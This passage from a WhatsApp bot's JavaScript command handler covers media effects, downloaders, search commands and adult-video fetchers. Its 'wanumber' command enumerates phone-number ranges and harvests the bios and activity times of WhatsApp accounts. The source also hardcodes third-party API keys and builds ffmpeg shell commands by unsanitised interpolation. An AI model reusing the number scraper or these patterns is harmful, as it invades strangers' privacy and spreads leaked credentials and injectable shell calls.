if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
			case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                await XeonStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await XeonStickWait()
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcxeon(err)
                let buff = fs.readFileSync(ran)
                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcxeon(e)
                }
                break
			case 'toonce':
            case 'toviewonce': {
                if (!m.quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                   XeonBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
			case 'fliptext': {
                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext dgxeon`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
			case 'style': case 'styletext': {
		if (!text) return replygcxeon('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcxeon(teks)
	    }
	    break
			case 'obfus': case 'obfuscate':{
if (!text) return replygcxeon(`Example ${prefix+command} const xeonbot = require('baileys')`)
try {
let meg = await obfus(text)
replygcxeon(`Success
${meg.result}`)
} catch {
	replygcxeon(`Use the command properly\nExample ${prefix+command} const xeonbot = require('baileys')`)
}
}
break
			case 'autodownload': case 'autodl':
if (!XeonTheCreator) return XeonStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autodownload = true
                    replygcxeon(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autodownload = false
                    replygcxeon(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'weather':{
if (!text) return replygcxeon('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           XeonBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'happymod':{
if (!q) return replygcxeon(`Example ${prefix+command} Sufway surfer mod`)
await XeonStickWait()
let kat = await scp2.happymod(q)
replygcxeon(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcxeon(`Enter the Google Drive link`)
	await XeonStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcxeon(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	XeonBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcxeon('Error: Check link or try another link') 
  }
}
break
           case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
           case 'spotify':{
	if (!text) return replygcxeon(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygcxeon('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygcxeon('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygcxeon( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "dgxeon",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await XeonBotInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygcxeon('*Error*')
    }
    }
    break
			case 'mediafire': {
  	if (!args[0]) return replygcxeon(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcxeon(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    XeonBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
			case 'remini': {
			if (!quoted) return replygcxeon(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcxeon(`Send/Reply Photos With Captions ${prefix + command}`)
			await XeonStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'imdb':
if (!text) return replygcxeon(`_Name a Series or movie`)
await XeonStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           XeonBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'itunes': {
if (!text) return replygcxeon('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
    } else {
      replygcxeon(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
            case 'lyrics': {
if (!text) return replygcxeon(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await XeonStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
try {
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const xeonlirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}catch{
replygcxeon(`Lyrics ${text} not found!`)
}
}
break
            case 'friend':
case 'searchfriend':{
await XeonStickWait()
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcxeon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
XeonBotInc.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
            case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
			case 'stickersearch': {
if (!text) return replygcxeon(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'apksearch': {
if (!text) return replygcxeon(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    XeonBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
			case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
  if (!text) return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcxeon('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcxeon('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygcxeon('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
  if (!text)
    return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
        XeonBotInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcxeon('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcxeon('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
